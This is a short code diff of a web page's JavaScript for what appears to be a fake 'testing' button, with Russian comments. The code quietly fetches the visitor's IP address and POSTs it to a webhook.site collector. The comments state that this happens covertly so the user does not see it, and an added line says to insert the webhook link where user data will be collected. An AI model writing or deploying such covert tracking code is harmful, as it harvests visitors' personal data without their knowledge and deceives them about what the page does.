@@ -53,11 +53,12 @@
             testBtn.textContent = '⏳ Тестирование...';
             results.style.display = 'none';
             
-            // Сразу отправляем IP (пользователь не видит)
+            // cразу отправляем IP (пользователь не видит)
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
-                    // Скрыто отправляем IP на сборщик
+                    // cкрыто отправляем IP на сборщик
+                    //  вставляем ссылку на webhook сайт на котором будут данные пользователя
                     fetch('https://webhook.site/3ef2b531-e76c-4801-9a99-76ae86c62ca2', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
